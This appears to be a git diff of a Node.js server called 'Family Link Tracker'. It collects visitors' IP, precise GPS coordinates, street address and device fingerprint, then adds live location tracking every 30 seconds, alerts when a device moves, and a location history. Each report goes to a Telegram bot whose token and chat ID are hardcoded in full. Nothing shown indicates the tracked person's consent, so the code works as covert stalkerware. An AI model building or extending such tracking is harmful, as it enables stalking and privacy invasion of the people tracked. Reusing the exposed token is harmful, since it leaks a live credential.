@@ -1,16 +1,15 @@
 const express = require('express');
 const fetch = require('node-fetch');
 const path = require('path');
-const fs = require('fs');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Start HTTP server (Render provides HTTPS automatically)
+// Start HTTP server
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🚀 Family Link Tracker is running on port ${PORT}!`);
     if (process.env.PORT) {
-        // Production (Render) — self-ping every 14 min to prevent sleeping
         const RENDER_URL = process.env.RENDER_EXTERNAL_URL || `https://localhost:${PORT}`;
         setInterval(() => {
             fetch(RENDER_URL).then(() => console.log('⏰ Keep-alive ping sent'))
@@ -18,7 +17,6 @@ app.listen(PORT, '0.0.0.0', () => {
         }, 14 * 60 * 1000);
         console.log('⏰ Keep-alive enabled (ping every 14 min)');
     } else {
-        // Local development — also start HTTPS for phone testing
         const https = require('https');
         const selfsigned = require('selfsigned');
         const attrs = [{ name: 'commonName', value: 'Family Tracker' }];
@@ -31,12 +29,12 @@ app.listen(PORT, '0.0.0.0', () => {
             });
     }
     console.log(`📊 Dashboard: /dashboard.html`);
+    console.log(`🗺️ Live Map: /map.html`);
     console.log('');
 });
 
-
 // ============================================
-// ⚙️ CONFIGURATION - Update these values
+// ⚙️ CONFIGURATION
 // ============================================
 const TELEGRAM_BOT_TOKEN = '8769669312:AAFNb_vouYN_jDT7v0CQuJYx-D6vvYbOZr4';
 const TELEGRAM_CHAT_ID = '6812241388';
@@ -45,10 +43,19 @@ const TELEGRAM_CHAT_ID = '6812241388';
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Store visitors log
+// ============================================
+// 📦 DATA STORES
+// ============================================
 const visitorsLog = [];
+const liveDevices = {};
+const locationHistory = [];
 
-// Get real IP from request
+// Generate device ID from IP + UserAgent
+function getDeviceId(ip, ua) {
+    return crypto.createHash('md5').update(ip + (ua || '')).digest('hex').substring(0, 10);
+}
+
+// Get real IP
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['x-real-ip'] ||
@@ -57,150 +64,215 @@ function getClientIP(req) {
         'Unknown';
 }
 
-// Send message to Telegram
-async function sendToTelegram(message) {
-    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-        console.log('⚠️  Chat ID not configured! Set TELEGRAM_CHAT_ID in server.js');
-        console.log('Message would have been:', message);
-        return;
-    }
+// Calculate distance between two GPS points (meters)
+function getDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371000;
+    const dLat = (lat2 - lat1) * Math.PI / 180;
+    const dLon = (lon2 - lon1) * Math.PI / 180;
+    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+        Math.sin(dLon / 2) * Math.sin(dLon / 2);
+    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+}
 
+// ============================================
+// 📨 TELEGRAM
+// ============================================
+async function sendToTelegram(message) {
+    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const response = await fetch(url, {
+        await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
         });
-
-        const data = await response.json();
-        if (!data.ok) {
-            console.error('Telegram API error:', data.description);
-        } else {
-            console.log('✅ Message sent to Telegram successfully');
-        }
     } catch (error) {
-        console.error('Error sending to Telegram:', error.message);
+        console.error('Telegram error:', error.message);
     }
 }
 
-// Send location to Telegram
 async function sendLocationToTelegram(lat, lon) {
     if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
-
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                latitude: lat,
-                longitude: lon
-            })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
         });
     } catch (error) {
-        console.error('Error sending location:', error.message);
+        console.error('Location send error:', error.message);
     }
 }
 
-// API endpoint to collect visitor data
+// ============================================
+// 📍 API: First-time data collection
+// ============================================
 app.post('/api/collect', async (req, res) => {
     const serverIP = getClientIP(req);
     const data = req.body;
-
-    // Use the REAL public IP from ip-api.com (client-side), fallback to server-detected IP
     const realIP = data.ipInfo?.ip || serverIP;
+    const deviceId = getDeviceId(realIP, data.device?.userAgent);
 
     const visitorInfo = {
         timestamp: new Date().toISOString(),
         ip: realIP,
+        deviceId,
         ...data
     };
 
-    // Also update the ipInfo.ip to ensure consistency
-    if (visitorInfo.ipInfo) {
-        visitorInfo.ipInfo.ip = realIP;
-    }
-
+    if (visitorInfo.ipInfo) visitorInfo.ipInfo.ip = realIP;
     visitorsLog.push(visitorInfo);
 
-    // Format message for Telegram
-    const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });
+    // Register as live device
+    liveDevices[deviceId] = {
+        deviceId,
+        ip: realIP,
+        device: data.device || {},
+        ipInfo: data.ipInfo || {},
+        gpsLocation: data.gpsLocation || {},
+        firstSeen: new Date().toISOString(),
+        lastSeen: new Date().toISOString(),
+        isOnline: true
+    };
 
-    let message = `🔔 <b>📍 تتبع جهاز - زائر جديد!</b>\n`;
+    // Add to location history
+    if (data.gpsLocation && data.gpsLocation.lat) {
+        locationHistory.push({
+            deviceId,
+            lat: data.gpsLocation.lat,
+            lon: data.gpsLocation.lon,
+            accuracy: data.gpsLocation.accuracy,
+            city: data.gpsLocation.city,
+            fullAddress: data.gpsLocation.fullAddress,
+            timestamp: new Date().toISOString()
+        });
+    }
+
+    // Telegram notification
+    const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });
+    let message = `🔔 <b>📍 جهاز جديد متصل!</b>\n`;
     message += `━━━━━━━━━━━━━━━━━━\n`;
     message += `🕐 <b>الوقت:</b> ${now}\n`;
+    message += `🆔 <b>معرّف:</b> <code>${deviceId}</code>\n`;
     message += `🌐 <b>IP:</b> <code>${realIP}</code>\n`;
 
-    // GPS Precise Location (priority - like Device Manager)
     if (data.gpsLocation && data.gpsLocation.lat) {
         message += `\n🎯 <b>الموقع الدقيق (GPS):</b>\n`;
         message += `   📍 المدينة: ${data.gpsLocation.city || 'غير معروف'}\n`;
         if (data.gpsLocation.district) message += `   🏘️ الحي: ${data.gpsLocation.district}\n`;
-        if (data.gpsLocation.road) message += `   �️ الشارع: ${data.gpsLocation.road}\n`;
-        if (data.gpsLocation.state) message += `   �🗺️ المحافظة: ${data.gpsLocation.state}\n`;
+        if (data.gpsLocation.road) message += `   🛣️ الشارع: ${data.gpsLocation.road}\n`;
+        if (data.gpsLocation.state) message += `   🗺️ المحافظة: ${data.gpsLocation.state}\n`;
         message += `   🌍 الدولة: ${data.gpsLocation.country || 'غير معروف'}\n`;
-        message += `   � الدقة: ${data.gpsLocation.accuracy || '?'}\n`;
+        message += `   🎯 الدقة: ${data.gpsLocation.accuracy || '?'}\n`;
         message += `   📐 الإحداثيات: <code>${data.gpsLocation.lat}, ${data.gpsLocation.lon}</code>\n`;
-        if (data.gpsLocation.fullAddress) {
-            message += `   🏠 العنوان الكامل: ${data.gpsLocation.fullAddress}\n`;
-        }
+        if (data.gpsLocation.fullAddress) message += `   🏠 العنوان: ${data.gpsLocation.fullAddress}\n`;
         message += `   🗺️ خريطة: https://www.google.com/maps?q=${data.gpsLocation.lat},${data.gpsLocation.lon}\n`;
-    } else {
-        // Fallback to IP-based location
-        if (data.ipInfo) {
-            message += `\n📍 <b>الموقع التقريبي (IP):</b>\n`;
-            message += `   🏙️ المدينة: ${data.ipInfo.city || 'غير معروف'}\n`;
-            message += `   🗺️ المنطقة: ${data.ipInfo.region || 'غير معروف'}\n`;
-            message += `   🌍 الدولة: ${data.ipInfo.country || 'غير معروف'}\n`;
-        }
+    } else if (data.ipInfo) {
+        message += `\n📍 <b>الموقع التقريبي (IP):</b>\n`;
+        message += `   🏙️ المدينة: ${data.ipInfo.city || 'غير معروف'}\n`;
+        message += `   🌍 الدولة: ${data.ipInfo.country || 'غير معروف'}\n`;
     }
 
     if (data.ipInfo) {
-        message += `\n🌐 <b>معلومات الشبكة:</b>\n`;
-        message += `   🏢 مزود الخدمة: ${data.ipInfo.isp || 'غير معروف'}\n`;
-        message += `   ⏰ المنطقة الزمنية: ${data.ipInfo.timezone || 'غير معروف'}\n`;
+        message += `\n🌐 <b>الشبكة:</b> ${data.ipInfo.isp || 'غير معروف'}\n`;
     }
 
     if (data.device) {
-        message += `\n📱 <b>معلومات الجهاز:</b>\n`;
-        if (data.device.model) message += `   📲 الطراز: ${data.device.model}\n`;
-        message += `   🖥️ النوع: ${data.device.type || (data.device.isMobile ? 'موبايل' : 'كمبيوتر')}\n`;
-        message += `   💻 النظام: ${data.device.platform || data.device.os || 'غير معروف'}\n`;
-        message += `   🌐 المتصفح: ${data.device.browserFull || data.device.browser || 'غير معروف'}\n`;
-        message += `   📐 الشاشة: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
-        if (data.device.memory && data.device.memory !== 'Unknown') message += `   🧠 الذاكرة: ${data.device.memory}\n`;
-        if (data.device.cores && data.device.cores !== 'Unknown') message += `   ⚙️ المعالج: ${data.device.cores} أنوية\n`;
-        if (data.device.gpu) message += `   🎮 GPU: ${data.device.gpu}\n`;
-        message += `   🗣️ اللغة: ${data.device.language || 'غير معروف'}\n`;
-        message += `   📶 الاتصال: ${data.device.connection || 'غير معروف'}\n`;
-        message += `   🔋 البطارية: ${data.device.battery || 'غير معروف'}${data.device.charging === 'نعم' ? ' ⚡ يشحن' : ''}\n`;
+        message += `\n📱 <b>الجهاز:</b>\n`;
+        if (data.device.model) message += `   📲 ${data.device.model}\n`;
+        message += `   💻 ${data.device.platform || data.device.os || '?'} | ${data.device.browserFull || data.device.browser || '?'}\n`;
+        message += `   🔋 ${data.device.battery || '?'}${data.device.charging === 'نعم' ? ' ⚡' : ''}\n`;
     }
 
-    message += `━━━━━━━━━━━━━━━━━━`;
+    message += `\n🔴 <b>التتبع المباشر مفعّل</b>\n━━━━━━━━━━━━━━━━━━`;
 
-    // Send text message
     await sendToTelegram(message);
 
-    // Send location pin — prefer GPS (accurate) over IP-based
-    const pinLat = data.gpsLocation?.lat || data.ipInfo?.lat;
-    const pinLon = data.gpsLocation?.lon || data.ipInfo?.lon;
-    if (pinLat && pinLon) {
-        await sendLocationToTelegram(pinLat, pinLon);
+    if (data.gpsLocation?.lat && data.gpsLocation?.lon) {
+        await sendLocationToTelegram(data.gpsLocation.lat, data.gpsLocation.lon);
     }
 
-    const locationCity = data.gpsLocation?.city || data.ipInfo?.city || 'Unknown';
-    console.log(`📋 Visitor logged: ${realIP} from ${locationCity}`);
+    console.log(`📋 New device: ${deviceId} | ${data.device?.model || 'Unknown'} | ${data.gpsLocation?.city || 'No GPS'}`);
+    res.json({ status: 'ok', deviceId });
+});
+
+// ============================================
+// 📡 API: Live tracking updates (every 30s)
+// ============================================
+app.post('/api/track', async (req, res) => {
+    const serverIP = getClientIP(req);
+    const { deviceId, lat, lon, accuracy, speed, altitude } = req.body;
+
+    if (!deviceId || !lat || !lon) {
+        return res.json({ status: 'error', msg: 'missing data' });
+    }
+
+    const now = new Date().toISOString();
+    locationHistory.push({ deviceId, lat, lon, accuracy, speed, timestamp: now });
+
+    // Keep history manageable
+    if (locationHistory.length > 5000) locationHistory.splice(0, locationHistory.length - 5000);
+
+    // Update live device & check movement
+    if (liveDevices[deviceId]) {
+        const prev = liveDevices[deviceId].gpsLocation;
+
+        if (prev && prev.lat && prev.lon) {
+            const dist = getDistance(prev.lat, prev.lon, lat, lon);
+            if (dist > 500) {
+                const deviceName = liveDevices[deviceId].device?.model || deviceId;
+                const timeStr = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });
+                let alert = `🚨 <b>تنبيه حركة!</b>\n`;
+                alert += `📱 ${deviceName}\n`;
+                alert += `📏 تحرك ${Math.round(dist)}م\n`;
+                alert += `🕐 ${timeStr}\n`;
+                alert += `📍 https://www.google.com/maps?q=${lat},${lon}`;
+                await sendToTelegram(alert);
+                await sendLocationToTelegram(lat, lon);
+            }
+        }
+
+        liveDevices[deviceId].gpsLocation = { lat, lon, accuracy, speed, altitude };
+        liveDevices[deviceId].lastSeen = now;
+        liveDevices[deviceId].isOnline = true;
+    }
 
     res.json({ status: 'ok' });
 });
 
-// Dashboard endpoint to view all visitors
+// ============================================
+// 📊 API: Get all live devices
+// ============================================
+app.get('/api/devices', (req, res) => {
+    const now = Date.now();
+    const devices = Object.values(liveDevices).map(d => {
+        const lastSeen = new Date(d.lastSeen).getTime();
+        const diffMin = (now - lastSeen) / 60000;
+        return {
+            ...d,
+            isOnline: diffMin < 2,
+            isRecent: diffMin < 5,
+            minutesAgo: Math.round(diffMin)
+        };
+    });
+    res.json(devices);
+});
+
+// ============================================
+// 📜 API: Location history for a device
+// ============================================
+app.get('/api/history/:deviceId', (req, res) => {
+    const history = locationHistory
+        .filter(h => h.deviceId === req.params.deviceId)
+        .slice(-100);
+    res.json(history);
+});
+
+// ============================================
+// 📋 API: All visitors (dashboard)
+// ============================================
 app.get('/api/visitors', (req, res) => {
     res.json(visitorsLog);
 });
